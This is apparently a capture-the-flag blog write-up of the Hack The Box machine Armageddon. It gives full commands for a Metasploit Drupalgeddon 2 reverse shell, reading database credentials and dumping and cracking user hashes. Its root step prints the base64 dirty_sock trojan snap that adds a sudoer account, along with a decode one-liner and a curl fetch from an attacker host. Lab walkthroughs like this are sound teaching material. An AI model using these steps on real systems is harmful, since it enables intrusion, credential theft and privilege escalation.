---
layout: post
title: HTB Armageddon
modified: 2023-03-24
tags: [Drupal, MySQL, Snap]
categories: [Hack The Box]
---

&nbsp;

<div style="position: absolute;">
  
</div>

* TOC
{:toc}

<div id="toc-skipped"></div>

<style>
img {
  width: 100%;
  height: 100%;
}
</style>

# Overview
Armageddon is an easy Linux box that starts off with only having ports 22 and 80 open. Port 80 is hosting Drupal 7.56, which is vulnerable to an exploit known as[ Drupalgeddon 2](https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/) which allows for remote code execution. From there we get a shell as `apache` and find a file within `/var/www` with MySQL credentials. We are able to utilize the credentials to dump the `users` table of `drupal` and get a `Drupal 7` hash for a user named `brucetherealadmin` and are able to SSH as the user due to password reuse. From there we see running `sudo -l` that the user is able to install packages using `snap`. We craft a malicious `snap` package by referencing the `.snap` package utilized in the `dirty_sock` exploit and get root. Now that the overview is out of the way, let's walkthrough the box.
# TCP Nmap Scan
```lua
# Nmap 7.93 scan initiated Wed Mar 22 09:56:13 2023 as: nmap.exe -sCV -oA nmap/tcp.out --min-rate=10000 -v 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.098s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82c6bbc7026a93bb7ccbdd9c30937934 (RSA)
|   256 3aca9530f312d7ca4505bcc7f116bbfc (ECDSA)
|_  256 7ad4b36879cf628a7d5a61e7060f5f33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Drupal 7 (http://drupal.org)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

Read data files from: C:\Program Files (x86)\Nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 22 09:56:26 2023 -- 1 IP address (1 host up) scanned in 12.29 seconds
```
# Initial Thoughts
## 22 - SSH
Usually when I see SSH the only thiing I will really test is how it accepts logins. Do I have to use a key? Can I log in with a password? I can test this by just trying to log in with an arbtirary user and see what the `Permission Denied` output is:
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/armageddon]
└─# ssh test@10.10.10.233
test@10.10.10.233's password:
Permission denied, please try again.
test@10.10.10.233's password:
Permission denied, please try again.
test@10.10.10.233's password:
test@10.10.10.233: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
```
Password authentication is definitely possible here so I'll keep an eye out to see if I can find credentials and try them against usernames I might find while searching around.
## 80 - HTTP
Nmap found a banner for `Drupal 7.0`. Drupal is a content management system (CMS) similar to Wordpress, etc. While looking into Drupal just by Googling around for exploits for the CMS or by using `searchsploit`, there is a known vulnerability called Drupalgeddon. This enticed me as the name of the box is called Armageddon which sounds very similar to Drupal + Armageddon so that might be an option. However, it's always good to validate to see if that exploit will work 100% by searching for a version number.
# Shell as apache
Looking at the Nmap output I noticed there was a file called `CHANGELOG.txt`. Typically, these files will show not only the changes that has happened version to version, but the version numbers as well. Typically the top version you see on the `CHANGELOG.txt` file will be the version you are currently on. Looking at the `CHANGELOG.txt` file I saw the following:
```shell
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.
```
So there's a pretty high chance that we're running `Drupal 7.56`.
We could also use a tool called `droopescan` to do some basic enumeration of Drupal for us:
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/armageddon]
└─# droopescan scan drupal -u http://10.10.10.233
[+] Plugins found:
    profile http://10.10.10.233/modules/profile/
    php http://10.10.10.233/modules/php/
    image http://10.10.10.233/modules/image/

[+] Themes found:
    seven http://10.10.10.233/themes/seven/
    garland http://10.10.10.233/themes/garland/

[+] Possible version(s):
    7.56

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.233/CHANGELOG.txt
```
It also finds that this might be `Drupal 7.56`. I like to keep things simple and search for low hanging fruit first so I searched `drupal` in `searchsploit` by running the following:
```shell
searchsploit drupal
```
One thing I found in there was this:
  <img src="{{ site.github.url }}/images/htb/armageddon/image-20230324004808.png" />

Looks like we might be able to use this exploit to get RCE on the host since our version number falls under `< 7.58`. We can go ahead and open up `metasploit` and search for this metasploit module and see if this exploit works:
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/armageddon]
└─# msfconsole

  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the
last opened session
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval
```
The exploit `#1` is the one I'd want to use so we can run `use 1` to select that exploit:
```shell
msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) >
```
Now let's run options to see what we need to adjust for the exploit to function properly:
```shell
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.211.55.15     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)



View the full module info with the info, or info -d command.
```
So we would need to change the `LHOST` to our HTB VPN IP address, the `RHOSTS` to the IP of the Armageddon box, and that's it!
```shell
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 10.10.14.8
LHOST => 10.10.14.8
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.233
RHOSTS => 10.10.10.233
```
Now let's run `exploit` or `run` and see if we get a `meterpreter` shell.
```shell
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 10.10.14.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.233:56768) at 2023-03-24 00:53:27 -0700

meterpreter >
```
We got a shell! We can run `shell` within the `meterpreter` shell to drop into a shell and run commands:
```shell
meterpreter > shell
Process 19114 created.
Channel 0 created.
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```
# Shell as brucetherealadmin
After getting a shell I usually like to run `linpeas` which is a tool used to enumerate interesting files, folders, permissions, etc. but I was unable to get it to execute for some reason even after giving it all the permission it needs. I started to just enumerate manually and look for a way off of this `apache` shell and get onto a user if possible. I ran `cat /etc/passwd` and noticed there is a user called `brucetherealadmin`
```shell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```
This is most likely the user I want to see if I can get onto. I ran `netstat -tulpn` to see if there is any local ports open that might be interesting such as a database:
```shell
netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
```
There's most likely a database running on `3306` as that is the default port for MySQL. If I can find credentials to get onto the database and then dump credentials from the database (most likely from Drupal's database) there is a possiblity I can get onto the user via SSH or just running `su` to switch to the user. manually looking through `/var/www/html/` I found a file under the absolute path `/var/www/html/sites/default/settings.php` and contained possible MySQL creds.
```shell
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
I can see if I can execute commands and view what databases are available by running this command within the shell:
```shell
mysql -u drupaluser -p -e 'show databases;'
Enter password: CQHEy@9M*m23gBVj
Database
information_schema
drupal
mysql
performance_schema
```
- `-u` Specifies the user we want to log in as for MySQL
- `-p` Specifies that we are going to use a password
- `-e` Is the command we want to execute. In this case I am running a query `show databases` which will show the databases within the MySQL database.
There is a database called `drupal`. Let's look into it more by going into the database by using the `use drupal` query and then running `show tables` after that to view the tables in the `drupal` database:
```shell
mysql -u drupaluser -p -e 'use drupal; show tables'
Enter password: CQHEy@9M*m23gBVj
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
```
We can get a list of all of the tables in the `drupal` database. There's a `user` table which looks interesting. We can run `select * from <table_name>` to view everything within a table within a database. In this case the table is called `users` so we'll run `select * from users` to view everything in the table:
```shell
mysql -u drupaluser -p -e 'use drupal; select * from users;'
Enter password: CQHEy@9M*m23gBVj
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London         0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
```
There looks to be a hash for the user `brucetherealadmin` in the `users` table. We can see if we can crack it with a tool such as `hashcat` which will show the password in plaintext if we are able to crack it. We need to identify what type of hash this is though. When I'm looking for the type of hash I usually use [hashcat's example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) and just search the first few characters such as `$S$` and see what it finds. In this case it finds that it's a hash for `Drupal 7` which makes sense and the mode is `7900` which we'll use when hashcat is looking for the hash format. So now it's time to run hashcat. All we need to do is run the following and let it run and see if we can crack the hash:
```shell
hashcat -m 7900 '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' /usr/share/wordlists/rockyou.txt
```
We get the password!
```shell
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```
So now we can see if we can login with SSH as `brucetherealadmin` with the password `booboo`:
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/armageddon]
└─# ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233's password:
Last login: Thu Mar 23 09:58:46 2023 from 10.10.14.9
[brucetherealadmin@armageddon ~]$
```
And we can!

# Shell as root
Running `sudo -l` we can see that our user is able to run `/usr/bin/snap install *`. 

```shell
[brucetherealadmin@armageddon tmp]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```
`Snap` is a software packaging and deployment system for Linux. Seeing that we can run this as root, this is pointing towards us having to go and create a malicious package to get us a root shell. A known exploit that sort of utilizies this to its advantage is [dirty_sock](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) which is a Linux privilege escalation technique using `snapd`. Within it we can see there is a `TROJAN_SNAP` variable which is going to make the `.snap` file. When it is installed, there will be a user named `dirty_sock` that we can log into using the creds `dirty_sock:dirty_sock`. From there we can run `sudo -i` and get root since this user will be in the `sudoers` group.
```shell
TROJAN_SNAP = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
+ 'A' * 4256 + '==')
```
I attempted to run the script on its own and I was getting errors. Instead, I'm just gonna utilize the `TROJAN_SNAP` variable and base64 decode the output of the print statement and push it into a file called `snap_exploit.snap` so that the file itself will not be the base64 encoded string, but the actual `snap` file itself.

```
python3 -c 'print ("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > snap_exploit.snap```
```
Now we can just host this file from our host machine and grab it from the compromised host:
We can host this file using the `http.server` Python module:
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/armageddon]
└─# python -m http.server 8083
Serving HTTP on 0.0.0.0 port 8083 (http://0.0.0.0:8083/) ...
```
Then grab it from the compromised host:
```shell
<$ curl http://10.10.14.8:8082/vulnsnap_1.0_all.snap -o vulnsnap_1.0_all.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0  21916      0 --:--:-- --:--:-- --:--:-- 22140
```
From here we can install the `.snap` file and get root:
```shell
[brucetherealadmin@armageddon tmp]$ sudo snap install snap_exploit.snap --dangerous --devmode
dirty-sock 0.1 installed

[brucetherealadmin@armageddon tmp]$ su dirty_sock
Password:
[dirty_sock@armageddon tmp]$ sudo -i

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock:
[root@armageddon ~]#
```
